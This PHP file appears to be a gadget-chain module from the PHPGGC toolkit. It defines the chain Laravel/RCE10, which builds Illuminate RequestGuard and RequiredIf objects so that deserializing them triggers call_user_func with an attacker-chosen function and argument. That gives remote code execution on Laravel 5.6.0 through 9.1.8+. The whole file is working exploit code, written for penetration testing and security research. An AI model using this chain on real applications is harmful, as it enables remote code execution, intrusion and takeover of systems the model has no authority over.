<?php

namespace GadgetChain\Laravel;

class RCE10 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '5.6.0 <= 9.1.8+';
    public static $vector = '__toString';
    public static $author = 'Arjun Shibu (twitter.com/0xsegf), 0xcrypto';

    public function generate(array $parameters)
    {
        $func = $parameters['function'];
        $arg = $parameters['parameter'];

        $guard = new \Illuminate\Auth\RequestGuard("call_user_func", $func, $arg);
        $userfn = [$guard, 'user'];
        $requiredif = new \Illuminate\Validation\Rules\RequiredIf($userfn);

        return $requiredif;
    }
}